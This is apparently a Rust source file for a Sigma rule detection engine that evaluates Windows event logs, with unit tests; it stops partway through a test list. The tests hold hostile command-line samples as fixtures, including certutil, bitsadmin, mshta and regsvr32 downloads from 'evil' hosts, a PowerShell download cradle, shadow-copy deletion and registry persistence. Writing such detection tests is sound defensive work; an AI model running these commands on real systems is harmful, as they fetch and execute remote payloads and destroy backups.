//! Native Sigma detection engine (Phase 1, DuckDB-free, per-event evaluation).
//!
//! Sigma rules are evaluated in Rust against each `EventFull` (parsing its
//! `attributes_json` once), mirroring the existing `run_heuristic_findings`
//! pattern so results flow through the normal finding pipeline as
//! `engine = "sigma"`.
//!
//! Supported subset (Phase 1): a rule is only evaluated if every construct it
//! uses is understood — otherwise it is SKIPPED (never partially/incorrectly
//! matched), so we do not emit false findings. Supported:
//! - logsource: `service` -> channel, `category` -> a small EventID map.
//! - selections: field maps with modifiers `contains|startswith|endswith|re`,
//!   `windash` and `cased` (no-op), the `all` list-modifier, plain equals,
//!   list values (OR), and `null`
//!   (field absent/empty). Keyword-list selections match a text haystack.
//! - condition: `and`/`or`/`not`/parentheses, `N of <sel>*`, `all of <sel>*`,
//!   `1 of them`, `all of them`.
//!
//! Rules that reference unknown modifiers or condition tokens are reported as
//! skipped by the caller (via [`SigmaRuleSet::skipped`]).

use regex::{Regex, RegexBuilder};
use serde::Deserialize;
use serde_json::Value;
use std::collections::BTreeMap;

use taotie_schema::{EventFull, FindingRecord};

/// Bundled default rule set (Sigma structure serialized as JSON).
const BUNDLED_RULES_JSON: &str = include_str!("../sigma_rules.json");

// --------------------------------------------------------------------------
// Raw rule (as authored / loaded)
// --------------------------------------------------------------------------

#[derive(Debug, Clone, Deserialize)]
struct RawRule {
    #[serde(default)]
    id: Option<String>,
    title: String,
    #[serde(default)]
    description: Option<String>,
    #[serde(default)]
    level: String,
    #[serde(default)]
    references: Vec<String>,
    #[serde(default)]
    falsepositives: Vec<String>,
    #[serde(default)]
    tags: Vec<String>,
    #[serde(default)]
    logsource: RawLogSource,
    detection: BTreeMap<String, Value>,
}

#[derive(Debug, Clone, Default, Deserialize)]
struct RawLogSource {
    // `product` is accepted in rule JSON but not used for filtering yet (Phase 2).
    #[serde(default)]
    service: Option<String>,
    #[serde(default)]
    category: Option<String>,
}

// --------------------------------------------------------------------------
// Compiled rule
// --------------------------------------------------------------------------

#[derive(Debug, Clone)]
struct CompiledRule {
    id: String,
    title: String,
    severity: String,
    attack: Vec<String>,
    /// ATT&CK tactic names from `attack.<tactic>` tags (non-technique).
    tactics: Vec<String>,
    description: Option<String>,
    references: Vec<String>,
    falsepositives: Vec<String>,
    /// Base filter derived from logsource (channel + optional EventID set).
    channel: Option<String>,
    event_ids: Vec<String>,
    /// Named selections.
    selections: BTreeMap<String, Selection>,
    condition: Cond,
}

#[derive(Debug, Clone)]
enum Selection {
    /// AND over field conditions.
    Fields(Vec<FieldCond>),
    /// OR over keyword substrings against the event haystack.
    Keywords(Vec<String>),
}

#[derive(Debug, Clone)]
struct FieldCond {
    field: String,
    op: MatchOp,
    /// Candidate values; combined by OR unless `all` is set (then AND).
    values: Vec<String>,
    all: bool,
    /// `field: null` — matches when the field is absent/empty.
    is_null: bool,
    /// `|windash` — treat `-`, `/` and unicode dashes as interchangeable.
    windash: bool,
    /// Pre-compiled patterns for the `|re` modifier (case-insensitive).
    regexes: Vec<Regex>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum MatchOp {
    Equals,
    Contains,
    StartsWith,
    EndsWith,
    Regex,
}

#[derive(Debug, Clone)]
enum Cond {
    Sel(String),
    And(Box<Cond>, Box<Cond>),
    Or(Box<Cond>, Box<Cond>),
    Not(Box<Cond>),
    /// `N of <prefix>*` — at least `n` selections whose name starts with prefix.
    /// prefix == "" means "them" (all selections).
    NOf(usize, String),
    /// `all of <prefix>*` / `all of them`.
    AllOf(String),
}

// --------------------------------------------------------------------------
// Rule set
// --------------------------------------------------------------------------

pub struct SigmaRuleSet {
    rules: Vec<CompiledRule>,
    /// Number of raw rules that could not be compiled (unsupported constructs).
    pub skipped: usize,
}

impl SigmaRuleSet {
    /// Load the bundled default rules.
    pub fn bundled() -> Self {
        Self::from_json(BUNDLED_RULES_JSON)
    }

    pub fn from_json(json: &str) -> Self {
        let raw: Vec<RawRule> = serde_json::from_str(json).unwrap_or_default();
        Self::from_raws(raw)
    }

    /// Load Sigma rules from YAML text (single- or multi-document). This is the
    /// on-disk format of upstream Sigma rules.
    pub fn from_yaml(yaml: &str) -> Self {
        let mut raws: Vec<RawRule> = Vec::new();
        for doc in serde_yaml::Deserializer::from_str(yaml) {
            // Map each YAML document into the JSON data model, then into RawRule.
            let Ok(value) = Value::deserialize(doc) else {
                continue;
            };
            match value {
                Value::Array(items) => {
                    for it in items {
                        if let Ok(r) = serde_json::from_value::<RawRule>(it) {
                            raws.push(r);
                        }
                    }
                }
                Value::Object(_) => {
                    if let Ok(r) = serde_json::from_value::<RawRule>(value) {
                        raws.push(r);
                    }
                }
                _ => {}
            }
        }
        Self::from_raws(raws)
    }

    /// Recursively load every `*.yml` / `*.yaml` Sigma rule under `dir`.
    /// Unreadable files and unsupported rules are skipped, never fatal.
    pub fn load_dir(dir: &std::path::Path) -> Self {
        let mut set = Self {
            rules: Vec::new(),
            skipped: 0,
        };
        let mut stack = vec![dir.to_path_buf()];
        while let Some(d) = stack.pop() {
            let Ok(entries) = std::fs::read_dir(&d) else {
                continue;
            };
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_dir() {
                    stack.push(path);
                } else if matches!(
                    path.extension().and_then(|e| e.to_str()),
                    Some("yml") | Some("yaml")
                ) {
                    if let Ok(text) = std::fs::read_to_string(&path) {
                        set.extend(Self::from_yaml(&text));
                    }
                }
            }
        }
        set
    }

    fn from_raws(raws: Vec<RawRule>) -> Self {
        let mut rules = Vec::new();
        let mut skipped = 0usize;
        for r in raws {
            match compile_rule(r) {
                Some(c) => rules.push(c),
                None => skipped += 1,
            }
        }
        Self { rules, skipped }
    }

    fn extend(&mut self, other: SigmaRuleSet) {
        self.rules.extend(other.rules);
        self.skipped += other.skipped;
    }

    pub fn len(&self) -> usize {
        self.rules.len()
    }

    pub fn is_empty(&self) -> bool {
        self.rules.is_empty()
    }
}

// --------------------------------------------------------------------------
// Public entry point (mirrors run_heuristic_findings)
// --------------------------------------------------------------------------

/// Evaluate the bundled Sigma rules against `events`, returning findings with
/// `engine = "sigma"`. Cannot fail: malformed rules/events are skipped.
pub fn run_sigma_findings(case_id: &str, events: &[EventFull]) -> Vec<FindingRecord> {
    let mut ruleset = SigmaRuleSet::bundled();
    // Optional: merge user-supplied Sigma rules (YAML) from a directory pointed to
    // by TAOTIE_SIGMA_RULES, so the bundled set can be extended with e.g. the
    // upstream Sigma repo without rebuilding.
    if let Ok(dir) = std::env::var("TAOTIE_SIGMA_RULES") {
        let path = std::path::Path::new(&dir);
        if path.is_dir() {
            let external = SigmaRuleSet::load_dir(path);
            tracing::debug!(
                external_rules = external.len(),
                external_skipped = external.skipped,
                dir = %dir,
                "sigma engine loaded external rules"
            );
            ruleset.extend(external);
        }
    }
    tracing::debug!(
        rules = ruleset.len(),
        skipped = ruleset.skipped,
        "sigma engine ready"
    );
    evaluate(case_id, &ruleset, events)
}

fn evaluate(case_id: &str, ruleset: &SigmaRuleSet, events: &[EventFull]) -> Vec<FindingRecord> {
    let mut findings = Vec::new();
    if ruleset.is_empty() {
        return findings;
    }
    for event in events {
        // Sigma here targets Windows event logs (evtx/hayabusa).
        if event.artifact_type != "evtx" && event.artifact_type != "hayabusa" {
            continue;
        }
        let ctx = EventContext::new(event);
        for rule in &ruleset.rules {
            if !rule_prefilter(rule, &ctx) {
                continue;
            }
            if eval_condition(&rule.condition, rule, &ctx) {
                findings.push(build_finding(case_id, rule, event));
            }
        }
    }
    findings
}

fn rule_prefilter(rule: &CompiledRule, ctx: &EventContext) -> bool {
    if let Some(channel) = &rule.channel {
        match &ctx.channel {
            Some(c) if c.eq_ignore_ascii_case(channel) => {}
            _ => return false,
        }
    }
    if !rule.event_ids.is_empty() {
        match &ctx.event_code {
            Some(code) if rule.event_ids.iter().any(|id| id == code) => {}
            _ => return false,
        }
    }
    true
}

fn build_finding(case_id: &str, rule: &CompiledRule, event: &EventFull) -> FindingRecord {
    let event_ids = vec![event.event_id.clone()];
    let mut entities: Vec<String> = Vec::new();
    if let Some(h) = event.host.as_deref().filter(|s| !s.is_empty()) {
        entities.push(format!("host:{h}"));
    }
    if let Some(u) = event.user_name.as_deref().filter(|s| !s.is_empty()) {
        entities.push(format!("user:{u}"));
    }
    if let Some(p) = event.process_name.as_deref().filter(|s| !s.is_empty()) {
        entities.push(format!("process:{p}"));
    }
    // Rule-level enrichment: why it fired + analyst context.
    let enrichment = serde_json::json!({
        "description": rule.description,
        "references": rule.references,
        "falsepositives": rule.falsepositives,
        "rule_level": rule.severity,
        "tactics": rule.tactics,
        "matched": {
            "channel": rule.channel,
            "event_ids": rule.event_ids,
        },
    });
    FindingRecord {
        detection_id: format!("finding_sigma_{}_{}", rule.id.replace('-', "_"), event.event_id),
        case_id: case_id.to_string(),
        engine: "sigma".to_string(),
        rule_id: Some(rule.id.clone()),
        title: format!("Sigma: {}", rule.title),
        severity: rule.severity.clone(),
        attack_json: serde_json::to_string(&rule.attack).unwrap_or_else(|_| "[]".to_string()),
        event_ids_json: serde_json::to_string(&event_ids).unwrap_or_else(|_| "[]".to_string()),
        entity_ids_json: serde_json::to_string(&entities).unwrap_or_else(|_| "[]".to_string()),
        first_seen_utc: Some(event.event_time_utc.clone()),
        message: Some(
            rule.description
                .clone()
                .unwrap_or_else(|| format!("{} ({})", rule.title, rule.id)),
        ),
        enrichment_json: serde_json::to_string(&enrichment).unwrap_or_else(|_| "{}".to_string()),
    }
}

// --------------------------------------------------------------------------
// Per-event field context
// --------------------------------------------------------------------------

struct EventContext<'a> {
    event: &'a EventFull,
    channel: Option<String>,
    event_code: Option<String>,
    /// Parsed `attributes_json.data` object.
    data: BTreeMap<String, String>,
    haystack: String,
}

impl<'a> EventContext<'a> {
    fn new(event: &'a EventFull) -> Self {
        let mut data = BTreeMap::new();
        let mut haystack = String::new();
        let mut channel = None;
        let mut event_code = None;
        haystack.push_str(&event.message_full.to_lowercase());
        // EventFull carries channel/EventID inside attributes_json (root), not as
        // dedicated columns (those live on the EventRow projection).
        if let Ok(Value::Object(root)) = serde_json::from_str::<Value>(&event.attributes_json) {
            channel = root
                .get("channel")
                .and_then(|v| v.as_str())
                .filter(|s| !s.is_empty())
                .map(|s| s.to_string());
            event_code = Some(json_scalar_to_string(root.get("event_id").unwrap_or(&Value::Null)))
                .filter(|s| !s.is_empty());
            if let Some(Value::Object(d)) = root.get("data") {
                for (k, v) in d {
                    let s = json_scalar_to_string(v);
                    if !s.is_empty() {
                        haystack.push(' ');
                        haystack.push_str(&s.to_lowercase());
                        data.insert(k.to_string(), s);
                    }
                }
            }
        }
        Self {
            channel,
            event_code,
            data,
            haystack,
            event,
        }
    }

    /// Resolve a Sigma field name to a scalar string value.
    fn field_value(&self, field: &str) -> Option<String> {
        // Prefer the raw EventData value (Sigma rules reference EventData names).
        if let Some(v) = self.data.get(field) {
            return Some(v.clone());
        }
        // Case-insensitive EventData lookup.
        for (k, v) in &self.data {
            if k.eq_ignore_ascii_case(field) {
                return Some(v.clone());
            }
        }
        // Fall back to top-level / derived fields.
        match field.to_ascii_lowercase().as_str() {
            "eventid" | "event_id" => self.event_code.clone(),
            "channel" => self.channel.clone(),
            "computer" | "computername" | "workstation" | "host" | "hostname" => {
                self.event.host.clone()
            }
            "image" | "newprocessname" | "processname" => self.event.process_name.clone(),
            "user" | "username" | "subjectusername" | "accountname" => {
                self.event.user_name.clone()
            }
            "targetfilename" | "filename" | "targetobject" => self.event.file_path.clone(),
            "ipaddress" | "sourceip" | "sourceaddress" | "destinationip" => self.event.ip.clone(),
            "commandline" => self.data.get("CommandLine").cloned(),
            _ => None,
        }
        .filter(|s| !s.is_empty())
    }
}

fn json_scalar_to_string(v: &Value) -> String {
    match v {
        Value::String(s) => s.clone(),
        Value::Number(n) => n.to_string(),
        Value::Bool(b) => b.to_string(),
        _ => String::new(),
    }
}

// --------------------------------------------------------------------------
// Compilation
// --------------------------------------------------------------------------

fn compile_rule(raw: RawRule) -> Option<CompiledRule> {
    let id = raw
        .id
        .clone()
        .unwrap_or_else(|| slugify(&raw.title));
    let severity = normalize_level(&raw.level);
    // `attack.t1070.001` -> `T1070.001` (keep the full technique + sub-technique).
    let attack: Vec<String> = raw
        .tags
        .iter()
        .filter_map(|t| {
            let lc = t.to_ascii_lowercase();
            let tail = lc.strip_prefix("attack.")?;
            if tail.starts_with('t') && tail[1..].chars().next().is_some_and(|c| c.is_ascii_digit())
            {
                Some(tail.to_ascii_uppercase())
            } else {
                None
            }
        })
        .collect();

    // `attack.<tactic>` (non-technique) tags -> tactic names, e.g. `attack.execution`.
    let tactics: Vec<String> = raw
        .tags
        .iter()
        .filter_map(|t| {
            let lc = t.to_ascii_lowercase();
            let tail = lc.strip_prefix("attack.")?;
            let is_technique = tail.starts_with('t')
                && tail[1..].chars().next().is_some_and(|c| c.is_ascii_digit());
            if is_technique {
                None
            } else {
                Some(tail.replace('_', " "))
            }
        })
        .collect();

    let (channel, event_ids) = compile_logsource(&raw.logsource);

    let mut selections = BTreeMap::new();
    let mut condition_str: Option<String> = None;
    for (name, value) in &raw.detection {
        if name == "condition" {
            condition_str = value.as_str().map(|s| s.to_string());
            continue;
        }
        let sel = compile_selection(value)?;
        selections.insert(name.clone(), sel);
    }
    let condition_str = condition_str?;
    if selections.is_empty() {
        return None;
    }
    let condition = parse_condition(&condition_str)?;
    // Validate that every selection referenced by the condition exists.
    if !condition_refs_valid(&condition, &selections) {
        return None;
    }

    Some(CompiledRule {
        id,
        title: raw.title,
        severity,
        attack,
        tactics,
        description: raw.description.filter(|d| !d.trim().is_empty()),
        references: raw.references,
        falsepositives: raw.falsepositives,
        channel,
        event_ids,
        selections,
        condition,
    })
}

fn compile_logsource(ls: &RawLogSource) -> (Option<String>, Vec<String>) {
    let channel = ls.service.as_deref().map(|s| match s.to_ascii_lowercase().as_str() {
        "security" => "Security".to_string(),
        "system" => "System".to_string(),
        "application" => "Application".to_string(),
        "powershell" => "Microsoft-Windows-PowerShell/Operational".to_string(),
        "sysmon" => "Microsoft-Windows-Sysmon/Operational".to_string(),
        "taskscheduler" => "Microsoft-Windows-TaskScheduler/Operational".to_string(),
        other => other.to_string(),
    });
    // Category -> a coarse EventID hint (Security channel). Kept small/safe.
    let event_ids = match ls.category.as_deref().map(|c| c.to_ascii_lowercase()) {
        Some(ref c) if c == "process_creation" => vec!["4688".to_string(), "1".to_string()],
        _ => Vec::new(),
    };
    (channel, event_ids)
}

fn compile_selection(value: &Value) -> Option<Selection> {
    match value {
        // Keyword list at selection level.
        Value::Array(items) => {
            let mut keywords = Vec::new();
            for it in items {
                match it {
                    Value::String(s) => keywords.push(s.to_lowercase()),
                    _ => return None,
                }
            }
            Some(Selection::Keywords(keywords))
        }
        // Field map.
        Value::Object(map) => {
            let mut fields = Vec::new();
            for (key, v) in map {
                fields.push(compile_field(key, v)?);
            }
            Some(Selection::Fields(fields))
        }
        _ => None,
    }
}

fn compile_field(key: &str, value: &Value) -> Option<FieldCond> {
    let mut parts = key.split('|');
    let field = parts.next()?.to_string();
    let mut op = MatchOp::Equals;
    let mut all = false;
    let mut windash = false;
    for m in parts {
        match m.to_ascii_lowercase().as_str() {
            "contains" => op = MatchOp::Contains,
            "startswith" => op = MatchOp::StartsWith,
            "endswith" => op = MatchOp::EndsWith,
            "re" => op = MatchOp::Regex,
            "all" => all = true,
            "windash" => windash = true,
            // Case sensitivity is not modeled (the engine matches case-insensitively).
            "cased" => {}
            // Unsupported modifier (base64, base64offset, cidr, ...) -> skip rule.
            _ => return None,
        }
    }
    if value.is_null() {
        return Some(FieldCond {
            field,
            op,
            values: Vec::new(),
            all,
            is_null: true,
            windash,
            regexes: Vec::new(),
        });
    }
    let values = match value {
        Value::Array(items) => {
            let mut out = Vec::new();
            for it in items {
                let s = json_scalar_to_string(it);
                if it.is_null() {
                    // list with null -> unsupported here
                    return None;
                }
                out.push(s);
            }
            out
        }
        Value::String(_) | Value::Number(_) | Value::Bool(_) => {
            vec![json_scalar_to_string(value)]
        }
        _ => return None,
    };
    // `|re`: pre-compile each pattern (case-insensitive, matching the engine's
    // overall case-insensitive behavior). A bad pattern skips the whole rule.
    let regexes = if op == MatchOp::Regex {
        let mut compiled = Vec::with_capacity(values.len());
        for v in &values {
            match RegexBuilder::new(v).case_insensitive(true).build() {
                Ok(rx) => compiled.push(rx),
                Err(_) => return None,
            }
        }
        compiled
    } else {
        Vec::new()
    };
    Some(FieldCond {
        field,
        op,
        values,
        all,
        is_null: false,
        windash,
        regexes,
    })
}

fn condition_refs_valid(cond: &Cond, selections: &BTreeMap<String, Selection>) -> bool {
    match cond {
        Cond::Sel(name) => selections.contains_key(name),
        Cond::And(a, b) | Cond::Or(a, b) => {
            condition_refs_valid(a, selections) && condition_refs_valid(b, selections)
        }
        Cond::Not(a) => condition_refs_valid(a, selections),
        // Prefix/them patterns are validated at eval time.
        Cond::NOf(_, _) | Cond::AllOf(_) => true,
    }
}

// --------------------------------------------------------------------------
// Condition mini-language parser
// --------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq)]
enum Tok {
    And,
    Or,
    Not,
    Of,
    Them,
    All,
    Num(usize),
    Ident(String),
    LParen,
    RParen,
}

fn tokenize_condition(input: &str) -> Option<Vec<Tok>> {
    let mut toks = Vec::new();
    for raw in input
        .replace('(', " ( ")
        .replace(')', " ) ")
        .split_whitespace()
    {
        let tok = match raw.to_ascii_lowercase().as_str() {
            "and" => Tok::And,
            "or" => Tok::Or,
            "not" => Tok::Not,
            "of" => Tok::Of,
            "them" => Tok::Them,
            "all" => Tok::All,
            "(" => Tok::LParen,
            ")" => Tok::RParen,
            _ => {
                if let Ok(n) = raw.parse::<usize>() {
                    Tok::Num(n)
                } else if is_ident(raw) {
                    Tok::Ident(raw.to_string())
                } else {
                    return None;
                }
            }
        };
        toks.push(tok);
    }
    if toks.is_empty() {
        None
    } else {
        Some(toks)
    }
}

fn is_ident(s: &str) -> bool {
    !s.is_empty()
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '*')
}

struct Parser {
    toks: Vec<Tok>,
    pos: usize,
}

impl Parser {
    fn peek(&self) -> Option<&Tok> {
        self.toks.get(self.pos)
    }
    fn next(&mut self) -> Option<Tok> {
        let t = self.toks.get(self.pos).cloned();
        self.pos += 1;
        t
    }
    fn parse_or(&mut self) -> Option<Cond> {
        let mut left = self.parse_and()?;
        while matches!(self.peek(), Some(Tok::Or)) {
            self.next();
            let right = self.parse_and()?;
            left = Cond::Or(Box::new(left), Box::new(right));
        }
        Some(left)
    }
    fn parse_and(&mut self) -> Option<Cond> {
        let mut left = self.parse_not()?;
        while matches!(self.peek(), Some(Tok::And)) {
            self.next();
            let right = self.parse_not()?;
            left = Cond::And(Box::new(left), Box::new(right));
        }
        Some(left)
    }
    fn parse_not(&mut self) -> Option<Cond> {
        if matches!(self.peek(), Some(Tok::Not)) {
            self.next();
            let inner = self.parse_not()?;
            return Some(Cond::Not(Box::new(inner)));
        }
        self.parse_primary()
    }
    fn parse_primary(&mut self) -> Option<Cond> {
        match self.next()? {
            Tok::LParen => {
                let inner = self.parse_or()?;
                match self.next() {
                    Some(Tok::RParen) => Some(inner),
                    _ => None,
                }
            }
            Tok::All => {
                // all of <them|prefix*>
                if !matches!(self.next(), Some(Tok::Of)) {
                    return None;
                }
                self.parse_quant_target().map(Cond::AllOf)
            }
            Tok::Num(n) => {
                if !matches!(self.next(), Some(Tok::Of)) {
                    return None;
                }
                self.parse_quant_target().map(|prefix| Cond::NOf(n, prefix))
            }
            Tok::Ident(name) => Some(Cond::Sel(name)),
            _ => None,
        }
    }
    fn parse_quant_target(&mut self) -> Option<String> {
        match self.next()? {
            Tok::Them => Some(String::new()),
            Tok::Ident(pat) => Some(pat.trim_end_matches('*').to_string()),
            _ => None,
        }
    }
}

fn parse_condition(input: &str) -> Option<Cond> {
    let toks = tokenize_condition(input)?;
    let mut p = Parser { toks, pos: 0 };
    let cond = p.parse_or()?;
    if p.pos == p.toks.len() {
        Some(cond)
    } else {
        None
    }
}

// --------------------------------------------------------------------------
// Evaluation
// --------------------------------------------------------------------------

fn eval_condition(cond: &Cond, rule: &CompiledRule, ctx: &EventContext) -> bool {
    match cond {
        Cond::Sel(name) => rule
            .selections
            .get(name)
            .is_some_and(|sel| eval_selection(sel, ctx)),
        Cond::And(a, b) => eval_condition(a, rule, ctx) && eval_condition(b, rule, ctx),
        Cond::Or(a, b) => eval_condition(a, rule, ctx) || eval_condition(b, rule, ctx),
        Cond::Not(a) => !eval_condition(a, rule, ctx),
        Cond::NOf(n, prefix) => {
            let matched = rule
                .selections
                .iter()
                .filter(|(name, _)| prefix.is_empty() || name.starts_with(prefix.as_str()))
                .filter(|(_, sel)| eval_selection(sel, ctx))
                .count();
            matched >= *n
        }
        Cond::AllOf(prefix) => rule
            .selections
            .iter()
            .filter(|(name, _)| prefix.is_empty() || name.starts_with(prefix.as_str()))
            .all(|(_, sel)| eval_selection(sel, ctx)),
    }
}

fn eval_selection(sel: &Selection, ctx: &EventContext) -> bool {
    match sel {
        Selection::Keywords(keywords) => {
            keywords.iter().any(|k| ctx.haystack.contains(k.as_str()))
        }
        Selection::Fields(fields) => fields.iter().all(|f| eval_field(f, ctx)),
    }
}

fn eval_field(cond: &FieldCond, ctx: &EventContext) -> bool {
    let value = ctx.field_value(&cond.field);
    if cond.is_null {
        return value.is_none();
    }
    let Some(value) = value else {
        return false;
    };
    // `|re`: match the original value against the pre-compiled patterns.
    if cond.op == MatchOp::Regex {
        return if cond.all {
            cond.regexes.iter().all(|rx| rx.is_match(&value))
        } else {
            cond.regexes.iter().any(|rx| rx.is_match(&value))
        };
    }
    let value_cmp = if cond.windash {
        normalize_dashes(&value.to_lowercase())
    } else {
        value.to_lowercase()
    };
    let test = |candidate: &str| -> bool {
        let cand = if cond.windash {
            normalize_dashes(&candidate.to_lowercase())
        } else {
            candidate.to_lowercase()
        };
        match cond.op {
            MatchOp::Equals => value_cmp == cand,
            MatchOp::Contains => value_cmp.contains(&cand),
            MatchOp::StartsWith => value_cmp.starts_with(&cand),
            MatchOp::EndsWith => value_cmp.ends_with(&cand),
            MatchOp::Regex => false, // handled above
        }
    };
    if cond.all {
        cond.values.iter().all(|c| test(c))
    } else {
        cond.values.iter().any(|c| test(c))
    }
}

/// `|windash` normalization: fold `/` and the unicode dash range (U+2010–U+2015)
/// to ASCII `-` so `-flag` and `/flag` are treated as equivalent.
fn normalize_dashes(s: &str) -> String {
    s.chars()
        .map(|c| match c {
            '/' | '\u{2010}'..='\u{2015}' => '-',
            other => other,
        })
        .collect()
}

// --------------------------------------------------------------------------
// Helpers
// --------------------------------------------------------------------------

fn normalize_level(level: &str) -> String {
    match level.to_ascii_lowercase().as_str() {
        "critical" => "critical",
        "high" => "high",
        "medium" => "medium",
        "low" => "low",
        "informational" | "info" => "info",
        _ => "medium",
    }
    .to_string()
}

fn slugify(title: &str) -> String {
    let mut out = String::new();
    for c in title.chars() {
        if c.is_ascii_alphanumeric() {
            out.push(c.to_ascii_lowercase());
        } else if !out.ends_with('-') {
            out.push('-');
        }
    }
    out.trim_matches('-').to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ev(channel: &str, event_code: &str, data: Value) -> EventFull {
        let attrs = serde_json::json!({ "channel": channel, "event_id": event_code, "data": data });
        EventFull {
            event_id: "e1".to_string(),
            case_id: "c1".to_string(),
            event_time_utc: "2023-01-01T00:00:00Z".to_string(),
            event_time_original: String::new(),
            time_kind: String::new(),
            time_confidence: 1.0,
            source_confidence: 1.0,
            artifact_type: "evtx".to_string(),
            source_file_id: String::new(),
            parse_run_id: String::new(),
            parser_name: String::new(),
            parser_version: String::new(),
            schema_version: String::new(),
            evidence_ref: String::new(),
            host: Some("HOST1".to_string()),
            user_name: None,
            process_name: None,
            file_path: None,
            ip: None,
            url: None,
            hash: None,
            event_action: String::new(),
            severity: "info".to_string(),
            message_short: String::new(),
            message_full: String::new(),
            raw_record_ref: String::new(),
            attributes_json: attrs.to_string(),
        }
    }

    #[test]
    fn bundled_rules_compile() {
        let rs = SigmaRuleSet::bundled();
        assert!(rs.len() >= 5, "expected bundled rules to compile");
    }

    #[test]
    fn attack_tags_keep_subtechnique() {
        let json = r#"[{"id":"a","title":"A","level":"low",
            "tags":["attack.t1070.001","attack.t1098","attack.g0006"],
            "detection":{"sel":["needle"],"condition":"sel"}}]"#;
        let rs = SigmaRuleSet::from_json(json);
        assert_eq!(rs.len(), 1);
        let e = ev("Security", "1", serde_json::json!({"CommandLine": "needle here"}));
        let f = evaluate("c1", &rs, std::slice::from_ref(&e));
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].attack_json, "[\"T1070.001\",\"T1098\"]");
    }

    #[test]
    fn condition_parses_common_forms() {
        assert!(parse_condition("selection").is_some());
        assert!(parse_condition("selection and not filter").is_some());
        assert!(parse_condition("(sel1 or sel2) and not filter").is_some());
        assert!(parse_condition("1 of selection_*").is_some());
        assert!(parse_condition("all of them").is_some());
        assert!(parse_condition("garbage $$$").is_none());
    }

    #[test]
    fn selection_and_not_filter() {
        let json = r#"[{
            "id":"t","title":"T","level":"high","tags":["attack.t1218"],
            "logsource":{"service":"security"},
            "detection":{
                "selection":{"EventID":"4688","CommandLine|contains":"rundll32"},
                "filter":{"CommandLine|contains":"\\system32\\mmc.exe"},
                "condition":"selection and not filter"
            }
        }]"#;
        let rs = SigmaRuleSet::from_json(json);
        assert_eq!(rs.len(), 1);
        let hit = ev("Security", "4688", serde_json::json!({"CommandLine":"rundll32.exe evil"}));
        let miss = ev("Security", "4688", serde_json::json!({"CommandLine":"rundll32.exe c:\\system32\\mmc.exe"}));
        assert_eq!(evaluate("c1", &rs, std::slice::from_ref(&hit)).len(), 1);
        assert_eq!(evaluate("c1", &rs, std::slice::from_ref(&miss)).len(), 0);
    }

    #[test]
    fn unsupported_modifier_skips_rule() {
        let json = r#"[{
            "id":"b","title":"B","level":"high",
            "detection":{"selection":{"CommandLine|base64offset|contains":"x"},"condition":"selection"}
        }]"#;
        let rs = SigmaRuleSet::from_json(json);
        assert_eq!(rs.len(), 0);
        assert_eq!(rs.skipped, 1);
    }

    #[test]
    fn re_modifier_matches_regex() {
        let json = r#"[{
            "id":"re1","title":"RE","level":"high",
            "detection":{"selection":{"CommandLine|re":"whoami\\s+/all"},"condition":"selection"}
        }]"#;
        let rs = SigmaRuleSet::from_json(json);
        assert_eq!(rs.len(), 1);
        let hit = ev("Security", "1", serde_json::json!({"CommandLine": "cmd.exe /c whoami /all"}));
        let miss = ev("Security", "1", serde_json::json!({"CommandLine": "whoami"}));
        assert_eq!(evaluate("c1", &rs, std::slice::from_ref(&hit)).len(), 1);
        assert_eq!(evaluate("c1", &rs, std::slice::from_ref(&miss)).len(), 0);
    }

    #[test]
    fn windash_modifier_matches_slash_variant() {
        let json = r#"[{
            "id":"wd1","title":"WD","level":"high",
            "detection":{"selection":{"CommandLine|contains|windash":"-enc"},"condition":"selection"}
        }]"#;
        let rs = SigmaRuleSet::from_json(json);
        assert_eq!(rs.len(), 1);
        let hit = ev("Security", "1", serde_json::json!({"CommandLine": "powershell /enc ABC"}));
        assert_eq!(evaluate("c1", &rs, std::slice::from_ref(&hit)).len(), 1);
    }

    #[test]
    fn from_yaml_compiles_and_fires() {
        // Upstream Sigma rules are YAML; ensure we parse and evaluate them.
        let yaml = "\
title: Encoded PowerShell
id: yaml-1
level: high
tags:
  - attack.t1059.001
detection:
  selection:
    CommandLine|contains: '-enc'
  condition: selection
";
        let rs = SigmaRuleSet::from_yaml(yaml);
        assert_eq!(rs.len(), 1);
        let hit = ev("Security", "1", serde_json::json!({"CommandLine": "powershell -enc ABC"}));
        let miss = ev("Security", "1", serde_json::json!({"CommandLine": "notepad.exe"}));
        assert_eq!(evaluate("c1", &rs, std::slice::from_ref(&hit)).len(), 1);
        assert_eq!(evaluate("c1", &rs, std::slice::from_ref(&miss)).len(), 0);
    }

    #[test]
    fn load_dir_reads_yaml_recursively() {
        let dir = std::env::temp_dir().join(format!("taotie_sigma_{}", std::process::id()));
        std::fs::create_dir_all(dir.join("sub")).unwrap();
        std::fs::write(
            dir.join("a.yml"),
            "title: A\nid: a\nlevel: high\ndetection:\n  sel:\n    CommandLine|contains: '-enc'\n  condition: sel\n",
        )
        .unwrap();
        std::fs::write(
            dir.join("sub").join("b.yaml"),
            "title: B\nid: b\nlevel: low\ndetection:\n  sel:\n    CommandLine|base64offset|contains: 'x'\n  condition: sel\n",
        )
        .unwrap();
        let rs = SigmaRuleSet::load_dir(&dir);
        let _ = std::fs::remove_dir_all(&dir);
        assert_eq!(rs.len(), 1); // a.yml compiles
        assert_eq!(rs.skipped, 1); // b.yaml uses an unsupported modifier
    }

    #[test]
    fn new_bundled_rules_fire_on_matching_commandline() {
        let rs = SigmaRuleSet::bundled();
        let cases: &[(&str, &str)] = &[
            ("schtasks-create", "schtasks.exe /create /tn evil /tr calc.exe /sc onlogon"),
            ("certutil-download", "certutil.exe -urlcache -split -f http://evil/p.exe p.exe"),
            ("bitsadmin-transfer", "bitsadmin /transfer job http://evil/p.exe c:\\p.exe"),
            ("shadowcopy-delete", "vssadmin delete shadows /all /quiet"),
            ("mshta-suspicious", "mshta.exe http://evil/a.hta"),
            ("regsvr32-scrobj", "regsvr32 /s /u /i:http://evil/a.sct scrobj.dll"),
            ("wmic-process-call", "wmic /node:host process call create calc.exe"),
            (
                "powershell-download-cradle",
                "powershell -nop iex (New-Object Net.WebClient).DownloadString('http://evil/a')",
            ),
            (
                "run-key-persistence",
                "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d evil.exe",
            ),
